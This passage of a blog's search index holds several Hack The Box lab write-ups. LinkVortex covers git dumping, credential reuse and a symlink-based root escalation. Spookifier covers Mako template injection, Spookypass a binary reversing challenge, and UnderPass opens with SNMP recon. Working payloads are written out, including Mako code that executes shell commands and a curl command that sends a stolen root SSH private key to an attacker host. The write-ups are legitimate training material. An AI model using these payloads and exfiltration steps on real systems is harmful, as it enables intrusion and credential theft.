`,url:"https://4wayhandshake.github.io/walkthrough/alert/"},"https://4wayhandshake.github.io/walkthrough/linkvortex/":{title:"LinkVortex",tags:["OSINT","Ghost CMS","Username Oracle","Git","GitHacker","GitHack","Credential Reuse","Symlinks"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION LinkVortex was all about the recon steps. A little bit of OSINT with a portion of web fuzzing is all that it takes. First though, we must discover the technology that the target website runs on, do a little reading on how it works, and make some educated guesses about directory structure: only then will we find the dashboard login. On the dashboard login, we discover a username oracle. Finally, after finding a vulnerable subdomain, we are able to do some .git reconstruction to obtain some hardcoded credentials in the source code. Combining all of those clues together, we can finally gain access to the dashboard.
Thankfully, the dashboard itself can Export everything that we need to know. Proper OSINT from earlier will inform us exactly what part of which file we should examine - that file will contain some credentials. We can re-use these credentials to gain SSH access to the target, along with the user flag.
Getting the root flag was a piece of cake. No enumeration is required - just read through the script that we have sudo access to, and try to find the logical flaw in the program. A little bit of Linux knowledge will help, but it shouldn&rsquo;t be too big of a challenge for anyone that got this far.
This box felt a little &ldquo;guessy&rdquo; at the beginning, but ended in a fun, quick privesc. Great for beginners!
RECON nmap scans Port scan I&rsquo;ll set $RADDR to the target machine&rsquo;s IP, and scan it with a simple port scan of the full range of ports:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA) |_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519) 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Did not follow redirect to http://linkvortex.htb/ Note the redirect to http://linkvortex.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR Nothing notable from this.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 17/udp open|filtered qotd 68/udp open|filtered tcpwrapped 136/udp open|filtered tcpwrapped 139/udp open|filtered tcpwrapped 996/udp open|filtered tcpwrapped 997/udp open|filtered tcpwrapped 1025/udp open|filtered blackjack 20031/udp open|filtered tcpwrapped 32769/udp open|filtered filenet-rpc 49194/udp open|filtered unknown 49201/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=linkvortex.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Oh interesting. There&rsquo;s some pretty wild headers on that site.
I wonder if they&rsquo;re using this &ldquo;Ghost&rdquo; (I&rsquo;m sure it&rsquo;s a popular name) &#x1f47b;
Edit: yup, it is!
I&rsquo;m really not loving their documentation, but yeah&hellip; there should be:
A dashboard at /ghost An API at /ghost/api I&rsquo;ll be sure to check those during directory enumeration &#x1f6a9;
Subdomain Enumeration Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results.
Next I&rsquo;ll check for subdomains of linkvortex.htb
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Great - we found dev.linkvortex.htb. I&rsquo;ll add that to /etc/hosts then move on to directory enumeration on linkvortex.htb and dev.linkvortex.htb:
echo &#34;$RADDR dev.$DOMAIN&#34; | sudo tee -a /etc/hosts Directory Enumeration Directories for linkvortex.htb:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -fs 0 Since we know it&rsquo;s using the &ldquo;Ghost&rdquo; CMS, let&rsquo;s check for that directory specifically:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/ghost/FUZZ -t 60 -ic -c -timeout 4 -mc all -fs 0,136 Great, there&rsquo;s an index page (.) and presumably some API that we can&rsquo;t access (api). I&rsquo;ll investigate it after I finish fuzzing (the json file too) &#x1f6a9;
Now, the directories for dev.linkvortex.htb:
ffuf -w $WLIST:FUZZ -u http://dev.$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-dev -of json -timeout 4 -fs 0 Hmm&hellip; That&rsquo;s not very useful, to be honest. I&rsquo;m going to retry both domains using a different wordlist (actually, a bunch of wordlists):
Merging wordlists I want a more general-purpose wordlist for doing web directory/file enumeration.
cd /usr/share/seclists/Discovery/Web-Content # Merge a bunch of wordlists from Seclists sudo sort -u raft-large-directories-lowercase.txt raft-large-words-lowercase.txt directory-list-2.3-small.txt quickhits.txt common.txt -o /tmp/dirs-and-files.txt; # Remove the junk with a trailing slash sudo grep -v &#39;.*/$&#39; /tmp/dirs-and-files.txt &gt; /usr/share/wordlists/dirs-and-files.txt wc -l /usr/share/wordlists/dirs-and-files.txt # 169747 lines -- not too bad! WLIST=/usr/share/wordlists/dirs-and-files.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -timeout 4 -mc all -fs 0 -fc 404 That&rsquo;s much better! Look at all the stuff we found &#x1f917;
I made some manual additions to the top of the wordlist, that&rsquo;s why there&rsquo;s a few duplicates. I&rsquo;ll fix that for the next time I use it.
ffuf -w $WLIST:FUZZ -u http://dev.$DOMAIN/FUZZ -t 60 -ic -c -timeout 4 -mc all -fs 0 -fc 404 Bingo! There&rsquo;s an exposed .git directory. Big mistake to leave that open. Before we dive into this, let&rsquo;s take a peek at the website through the browser.
Exploring the Website http://linkvortex.htb seems like a typical landing page. As far as I can tell, it&rsquo;s completely static.
We discovered some stuff under /ghost earlier, too. At http://linkvortex.htb/ghost we get this login page:
I tried the usual easy credentials (admin:admin etc), but no luck.
One thing that I noticed is that the Forgot? button can be used for username enumeration. Check out how this shows &ldquo;User not found.&rdquo;:
You might even call this a &ldquo;username oracle&rdquo; if you wanted to sound fancy &#x1f447;
And that json file we saw earlier. It&rsquo;s a JSON Web Keyset file (JWKS), used for verifying JWT integrity:
{ &#34;keys&#34;: [ { &#34;e&#34;: &#34;AQAB&#34;, &#34;kid&#34;: &#34;0fWYMUHmh_awzS--ldm-OS-ecbdYWrVKd-7TTjj-kfk&#34;, &#34;kty&#34;: &#34;RSA&#34;, &#34;n&#34;: &#34;nui6u1jo3tg4Sb7aQHATpJwYwYfSdOP-OyK3mmWDX7owdjukqiimb4obqdhFKm-_ERzDWVQ3e5-QzwcRCSkftGLOCOJcM36lwNrS_iUekdUrKpVYDWaeM-zgDMmmBbAtIn_NoDxQz_JmromMDpr2oOVCMQN2Vca0Ba0fsHXRax8&#34;, &#34;use&#34;: &#34;sig&#34; } ] } The subdomain http://dev.linkvortex.htb is even simpler:
Yep, that&rsquo;s all it is&hellip; Of course, there&rsquo;s also the .git directory:
FOOTHOLD &#x1f6ab; Exposed git (GitHacker) We can use GitHacker to analyze the .git directory, and extract the source code.
The author of GitHacker instructs us to use it only from a docker container, since some website publishers may intentionally leave malicious .git directories on their sites (perhaps as canaries even)
Let&rsquo;s follow their advice, and do it the safe way &#x1f44d;
Note that we must provide the docker container with a copy of our host system&rsquo;s /etc/hosts file (read-only). Otherwise, it can&rsquo;t resolve the IP address of the HTB box
cd source docker run -v /etc/hosts:/etc/hosts:ro -v $(pwd)/results:/tmp/githacker/results wangyihang/githacker --output-folder /tmp/githacker/results --url http://dev.linkvortex.htb/.git/ &#x26a0;&#xfe0f; Looks like there&rsquo;s a bug with the repository. Even though I&rsquo;m pretty sure I have the right syntax shown above, it won&rsquo;t work. There is already an Issue filed in the Github repo for this behaviour.
&#x1f6ab; Exposed git (Git-dumper + GitTools) Install Git-dumper if you don&rsquo;t already have it:
cargo install git-dumper Run it against the directory:
# make a directory to hold the .git directory mkdir git-dumper git-dumper -t 16 http://dev.linkvortex.htb/.git/ ./git-dumper Now we need to extract the directory. For this, we can use GitTools Extractor
cd ~/Tools git clone https://github.com/internetwache/GitTools.git cd - # The first argument is the path to the directory that contains the .git directory ~/Tools/GitTools/Extractor/extractor.sh ./git-dumper ./GitToolsExtractor and&hellip;. it did absolutely nothing &#x1f612;
Exposed git (GitHack) Ok, let&rsquo;s try yet another tool: GitHack. First, let&rsquo;s download it to a temporary directory:
cd ./tools git clone https://github.com/lijiejie/GitHack.git cd GitHack python3 GitHack.py http://dev.linkvortex.htb/.git/ After a short while, it terminated, and I found a directory adjacent to the python script, dev.linkvortex.htb. Looks like the script worked!
cd dev.linkvortex.htb tree . Inside the repository Let&rsquo;s check out that Dockerfile first
FROM ghost:5.58.0 # Copy the config COPY config.production.json /var/lib/ghost/config.production.json # Prevent installing packages RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb # Wait for the db to be ready first COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh COPY entry.sh /entry.sh RUN chmod +x /var/lib/ghost/wait-for-it.sh RUN chmod +x /entry.sh ENTRYPOINT [&#34;/entry.sh&#34;] CMD [&#34;node&#34;, &#34;current/index.js&#34;] Too bad we don&rsquo;t have a copy of that .json file&hellip; Oh well. Let&rsquo;s check out the .js file.
Reading through the file, there appear to be several credentials hardcoded into it. They&rsquo;re probably just for testing, but still worth writing down:
test@example.com : OctopiFociPilfer45 test-leo@example.com : thisissupersafe not-invited@example.org : lel123456 ??? : 1234567890 I&rsquo;m not very confident that these credentials will be useful, but let&rsquo;s try them out in the Ghost login anyway:
None of the credentials I found in the js file worked.
&#x1f550; I eventually found one clue though. Each article on http://linkvortex.htb is written by the user admin:
Combine this with the username oracle we found earlier, during recon, and we can verifiably figure out an email to login with &#x1f4a1;
After a few guesses at the domain part of the email, I found one email that produced the &ldquo;Your password is incorrect&rdquo; message - which proves that the email exists!
Great, so let&rsquo;s try spraying those passwords at this email and see if we get a hit:
&#x2705; admin@linkvortex.htb : OctopiFociPilfer45 &#x274c; admin@linkvortex.htb : thisissupersafe &#x274c; admin@linkvortex.htb : lel123456 &#x274c; admin@linkvortex.htb : 1234567890 Alright! The first one worked &#x1f602; We&rsquo;re into the dashboard now:
Just in case, I tried this same password against SSH for the users &ldquo;admin&rdquo; and &ldquo;leo&rdquo; - no luck.
USER FLAG Dashboard I was having a lot of trouble finding any useful information on the Dashboard, so I tried the Export feature within Settings &gt; Labs. This produced a JSON file with everything important inside.
JSON Export Notably, the version number: 5.58.0.
About halfway down the JSON file, there are also some RSA keys - both public and private (two keypairs):
To retain the proper formatting, I echo&rsquo;d them into files:
Also, near the bottom of the JSON file, we see the password hash for the admin user. I&rsquo;m sure this is just the hash of the password we logged in with, though:
CVE-2023-40028 After a bit of research, I found a github repo claiming to be a PoC for an arbitrary file read (authenticated) for Ghost CMS. It&rsquo;s registered as CVE-2023-40028.
Be sure to change the variable GHOST_URL at line 14 to http://linkvortex.htb before attempting to run the script.
Whoa! The exploit script worked perfectly. Now that I know the right username, I should try those passwords and private keys again.
&#x27a1;&#xfe0f; Nope, neither private key worked, nor did any of the passwords.
In retrospect, I realize we&rsquo;re probably seeing the /etc/passwd file of the Ghost CMS docker container &#x1f914;
Unfortunately, there was no id_rsa file for the user node either.
When checking out the Dockerfile (after extracting the .git) we saw a mention of a JSON file, /var/lib/ghost/config.production.json. This is the main configuration file for Ghost CMS. Maybe there are some sensitive details in there?
{ &#34;url&#34;: &#34;http://localhost:2368&#34;, &#34;server&#34;: { &#34;port&#34;: 2368, &#34;host&#34;: &#34;::&#34; }, &#34;mail&#34;: { &#34;transport&#34;: &#34;Direct&#34; }, &#34;logging&#34;: { &#34;transports&#34;: [&#34;stdout&#34;] }, &#34;process&#34;: &#34;systemd&#34;, &#34;paths&#34;: { &#34;contentPath&#34;: &#34;/var/lib/ghost/content&#34; }, &#34;spam&#34;: { &#34;user_login&#34;: { &#34;minWait&#34;: 1, &#34;maxWait&#34;: 604800000, &#34;freeRetries&#34;: 5000 } }, &#34;mail&#34;: { &#34;transport&#34;: &#34;SMTP&#34;, &#34;options&#34;: { &#34;service&#34;: &#34;Google&#34;, &#34;host&#34;: &#34;linkvortex.htb&#34;, &#34;port&#34;: 587, &#34;auth&#34;: { &#34;user&#34;: &#34;bob@linkvortex.htb&#34;, &#34;pass&#34;: &#34;fibber-talented-worth&#34; } } } } Ok, there&rsquo;s one more credential: bob@linkvortex.htb : fibber-talented-worth. Let&rsquo;s check again for credential reuse:
ssh bob@$RADDR # fibber-talented-worth This opens an SSH connection for us in /home/bob, adjacent to the user flag. Read it for some points:
cat user.txt ROOT FLAG Local enumeration - bob Checking sudo -l shows that bob can run /opt/ghost/clean_symlink.sh as an elevated process:
# User bob may run the following commands on linkvortex: # (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png Here is the script:
#!/bin/bash QUAR_DIR=&#34;/var/quarantined&#34; if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi LINK=$1 if ! [[ &#34;$LINK&#34; =~ \\.png$ ]]; then /usr/bin/echo &#34;! First argument must be a png file !&#34; exit 2 fi if /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo &#34;$LINK_TARGET&#34; | /usr/bin/grep -Eq &#39;(etc|root)&#39;;then /usr/bin/echo &#34;! Trying to read critical files, removing link [ $LINK ] !&#34; /usr/bin/unlink $LINK else /usr/bin/echo &#34;Link found [ $LINK ] , moving it to quarantine&#34; /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo &#34;Content:&#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null fi fi fi Understand the script Let&rsquo;s think of this backwards.
The goal is to run the /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null line so that it reads the target file (probably the root flag?).
To get to the goal, we need to pass these checks, in reverse order:
The CHECK_CONTENT environment variable should be set to true The LINK_TARGET variable must not contain the substrings etc or root The argument provided to the script ($1) must be a symlink The argument provided to the script must end with .png Now, if the target file that we want to read was somewhere in /home/bob, then this would be completely trivial; we would just make a symlink, then call the script:
ln -s /home/bob/target/filepath /home/bob/my-link.png export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/my-link.png &hellip;then my-link.png would be moved to the quaranine directory, and the contents of /home/bob/target/filepath would be printed to the screen.
Trick the script So what&rsquo;s the trick, here? It&rsquo;s pretty easy if you&rsquo;ve ever encountered this problem in linux (because it&rsquo;s usually the cause of quite a headache!):
Just use an intermediate link &#x1f602;
Make a symlink to a symlink to the target.
Script &#x27a1;&#xfe0f; symlink​ A &#x27a1;&#xfe0f; symlink B &#x27a1;&#xfe0f; target file
Yes, that&rsquo;s all!
mkdir /tmp/.Tools ln -s /root/root.txt /tmp/.Tools/second-hop ln -s /tmp/.Tools/second-hop /tmp/.Tools/first-hop.png Then run the script with sudo:
export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/.Tools/first-hop.png rm /tmp/.Tools/* # clean up after yourself. &#x1f609; The contents of the flag should appear
EXTRA CREDIT Privesc to root We leaked the flag contents, but haven&rsquo;t actually gotten a root shell yet.
Since we&rsquo;re pretty sure that root has ssh access, we can turn an arbitrary file read into a root shell by grabbing the SSH private key.
First, we need a way to accept the key. I&rsquo;ll start up an http server with the ability to recieve file uploads:
sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v Now let&rsquo;s repeat the attack, this time getting /root/.ssh/id_rsa instead of the root flag:
ln -s /root/.ssh/id_rsa /tmp/.Tools/second-hop ln -s /tmp/.Tools/second-hop /tmp/.Tools/first-hop.png export CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/.Tools/first-hop.png | tee mykey curl -X POST -F &#39;file=@./mykey&#39; http://10.10.14.21:8000 rm ./mykey # clean up after yourself. Now on the attacker host, set the right permissions on the key and use it to log in:
mv ./mykey ../loot/id_rsa chmod 600 ../loot/id_rsa ssh -i ../loot/id_rsa root@$RADDR &#x1f370; Now we have a way to log back in as root, if we wanted to.
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools (although it should already be empty):
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf source/* It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f6e0;&#xfe0f; Have several tools on-hand for analyzing git information. Fortunately, I had a few programs that I already knew about for analyzing exposed .git directories&hellip;. but unfortunately, none of them worked! When I tried another tool (the fourth one in line) I finally had some success.
&#x1f575;&#xfe0f;&zwj;&#x2640;&#xfe0f; Assemble all your clues and check back on them. On this box, we had to find at least three things before being able to access the dashboard. It&rsquo;s important to keep an open mind and not fixate on individual clues - instead, try to figure out how each clue factors into the broader puzzle.
Defender &#x1f52e; Don&rsquo;t divulge unnecessary info, especially on internet-facing services. I&rsquo;m not sure if the current version is like this, but we encountered a username oracle at the Ghost CMS login page. It only took a couple guesses to obtain a valid username, once we had the clues and the username oracle in front of us.
&#x1f502; Use recursive logic in scripts. A simple loop with readlink would have been enough to thwart the privesc technique we used.
`,url:"https://4wayhandshake.github.io/walkthrough/linkvortex/"},"https://4wayhandshake.github.io/ctf/spookifier/":{title:"Spookifier",tags:["Unobfuscated secrets","Decompilation"],categories:["Challenge","HTB","Web","Very Easy"],content:`INTRODUCTION Spookifier is an excellent introduction to a very fun class of web vulnerabilities. It makes for a nice little &ldquo;coffee break&rdquo; challenge. Perfect if you don&rsquo;t have much time.
FIRST TAKE Start by downloading the files. It&rsquo;s a docker container with a Flask application inside. Read the code, and realize there&rsquo;s only one endpoint inside.
It&rsquo;s a Python Flask server and uses Mako as a template engine.
FIND THE VULN Without too much code reading, it is clear that there probably isn&rsquo;t a command injection here: there&rsquo;s no obvious vulnerable code that normally leads to OS command injection. But there might be an SSTI&hellip; I&rsquo;m not super familiar with Mako, so I&rsquo;ll investigate.
Whitebox Approach Lining it up the situation to the flowchart shown in PayloadAllTheThings&hellip;
&hellip;we can check for Mako SSTI:
\${&#34;z&#34;.join(&#34;ab&#34;)} Yep, it renders as azb. There&rsquo;s definitely python being executed here, confirming the presence of SSTI.
Blackbox Approach Other fuzzing didn&rsquo;t work at all, so I began to suspect that SSTI was present.
To investigate, I tried throwing a template injection wordlist at it, using ffuf:
# This wordlist contains a bunch of ways to execute 42 * 42 : expected result = 1764 WLIST=/usr/share/seclists/Fuzzing/template-engines-expression.txt # Use ffuf in regex matching mode ffuf -w $WLIST:FUZZ -u &#39;http://94.237.54.116:35270/?text=FUZZ&#39; -c -mr &#39;1764&#39; Results:
[[\${42*42}]] [Status: 200, Size: 7734, Words: 2625, Lines: 224, Duration: 107ms] {^xyzm42}1764{/xyzm42} [Status: 200, Size: 7830, Words: 2631, Lines: 224, Duration: 111ms] \${42*42} [Status: 200, Size: 7718, Words: 2613, Lines: 224, Duration: 108ms] The middle one is a false positive, but the other two share the same syntax: \${something}.
To confirm, I&rsquo;ll go through the flowchart:
\${77} &ndash;&gt; YES *a{comment}b &ndash;&gt; NO \${&ldquo;z&rdquo;.join(&ldquo;ab&rdquo;)} &ndash;&gt; YES This indicates the template engine is Mako, and that an SSTI exists.
MAKE THE EXPLOIT Next, I&rsquo;ll investigate how Mako templates work.
Turns out that they use &lt;% and %&gt; for the template literals, so we should be able to just plop some python into there (if we want it executed but not rendered).
Let&rsquo;s start with the standard test for SSTI:
&lt;%import os;x=os.popen(&#39;id&#39;).read()%&gt; \${x} Result: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
&#x1f44f; Perfect! Now let&rsquo;s just grab the flag. We already know its filepath from reading the source code:
&lt;%import os;x=os.popen(&#39;cat /flag.txt&#39;).read()%&gt; \${x} And there&rsquo;s the flag &#x1f609;
Useful resources: https://portswigger.net/research/server-side-template-injection
`,url:"https://4wayhandshake.github.io/ctf/spookifier/"},"https://4wayhandshake.github.io/ctf/spookypass/":{title:"Spookypass",tags:["Unobfuscated secrets","Decompilation"],categories:["Challenge","HTB","Reversing","Very Easy"],content:`INTRODUCTION Super easy challenge. This challenge introduces a beginner at reversing into opening their tools and checking inside a file.
FIRST TAKE Start by downloading the file. We can check file to see the file type:
./pass: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3008217772cc2426c643d69b80a96c715490dd91, for GNU/Linux 4.4.0, not stripped
Try running the executable. It presents you with a simple prompt, asking the password:
SOLUTION I&rsquo;ll be using Binary Ninja to decompile the encryption program. Thankfully, it does a very nice job of laying out the code.
Reader: if you haven&rsquo;t tried Binary Ninja yet, go try it! It&rsquo;s free, cross-platform, and very high quality.
For similar challenges, I&rsquo;ve used Ghidra, Ida, and Radare2. My main takeaway is that Binary Ninja has very similar functionality but is far, far easier to operate. There&rsquo;s even a cloud-based version so you won&rsquo;t need a local installation.
C programs tend to have a bunch of constants defined near the beginning, up in the big grey splotch at the top (it ends at roughly 0x310):
However, this program didn&rsquo;t seem to have anything up there.
Recalling that this is a &ldquo;very easy&rdquo; challenge, I figured I&rsquo;d just search for the flag directly. Click the little magnifying glass icon (I&rsquo;m on the desktop version of Binary Ninja) to open the Find pane:
Select Text and enter a search term. I searched for the typical flag format HTB{. Right away, we see a result at address 0x4060:
Very easy, indeed! &#x1f44d;
LESSONS LEARNED Start with the obvious stuff then work up from there. As long as you have the right tools on-hand, a lot of problems become pretty easy. `,url:"https://4wayhandshake.github.io/ctf/spookypass/"},"https://4wayhandshake.github.io/walkthrough/underpass/":{title:"UnderPass",tags:["OSINT","SNMP","UDP","Default Credentials","Insecure Hashing","mosh"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION UnderPass was a nice, quick and cheerful box. A perfect choice if you have limited time but feel the itch to hack something. Kudos to the box creator, @dakkmaddy, for putting together this treat. It was released between Season 6 and 7.
Recon was pleasant, and a great reminder to always include some UDP scanning (even if it usually isn&rsquo;t very useful). It was a mixture of OSINT, Web enumeration, and SNMP. After gathering sufficient clues, it should be pretty easy to locate the correct service to attack. Hopefully, research already turned up some default credentials for the vulnerable service, because that&rsquo;s what lets you into the dashboard.
I spent a bit of extra time on the dashboard, because there were a few things that looked glaringly insecure. In the end, the path towards an SSH connection was much more direct than I thought, involving a very weak hash to crack. No need to drag out your mega hash-cracking rig, Crackstation is enough for this one &#x1f609;
The cracked hash gets you an easy SSH connection, and the user flag. Besides a few distractors, privesc was very quick on this box. We took advantage of the generous permissions granted to our SSH-connected user for privesc. It didn&rsquo;t really involve any exploitation - moreso just using the software as it was intended. The only advice you&rsquo;ll need is &ldquo;RTFM!&rdquo; &#x1f602;
RECON nmap scans Port scan I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA) |_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.52 (Ubuntu) The webserver on port 80 is only showing the default Apache page. There is probably a subdomain or directory to investigate.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No significant results
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server (public) Very interesting! SNMPv1 is available; if I recall correctly, that&rsquo;s really easy to enumerate. This would be a great place to start &#x1f6a9;
&#x1f605; I always check UDP, and it almost never pays off. Glad I stuck with it!
SNMP scripts I&rsquo;ll also run the default nmap scripts for SNMP:
nmap -sU -p 161 --script &#34;snmp*&#34; -T4 $RADDR PORT STATE SERVICE 161/udp open snmp | snmp-info: | enterprise: net-snmp | engineIDFormat: unknown | engineIDData: c7ad5c4856d1cf6600000000 | snmpEngineBoots: 31 |_ snmpEngineTime: 10m53s | snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 |_ System uptime: 10m55.91s (65591 timeticks) | snmp-brute: |_ public - Valid credentials SNMP Let&rsquo;s start with some enumeration:
snmp-check $RADDR Check out the Hostname - the letters U, D, and P are capitalized. The description is what you&rsquo;d get from uname -a. Domain is underpass.htb They claim to run daloradius - I&rsquo;ll look into what that might be. A quick search reveals that Daloradius is an open source project. It typically uses PHP + MariaDB. More details below.
Daloradius The quick-start instructions nudge the user to configure MariaDB with credentials raduser : radpass in a database called raddb.
Also, the default root credentials for the internal application, for &ldquo;operators&rdquo;, normally on port 8000, are administrator : radius.
Webserver Strategy Based on the contact email (steve@underpass.htb) that we saw from SNMP, I&rsquo;ll add underpass.htb to /etc/hosts:
DOMAIN=underpass.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts Next I&rsquo;ll perform vhost and subdomain enumeration. First, I&rsquo;ll check for alternate hosts:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from that.
Next I&rsquo;ll check for subdomains of underpass.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Nuffin.
Next, directory enumeration:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -v Still nothing! However, due to the information I found earlier about daloradius, I tried http://underpass.htb/daloradius and got an HTTP 403. Therefore, it&rsquo;s probably worth checking that directory:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/daloradius/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-daloradius -of json -timeout 4 Great - looks like we found the daloradius app. I&rsquo;ll allow .php extensions, since we know that&rsquo;s the language that the application uses:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/daloradius/FUZZ -t 60 -ic -c -timeout 4 -r -e &#39;.php&#39; -mc all -fs 275 The contents of /daloradius/.gitignore are as follows:
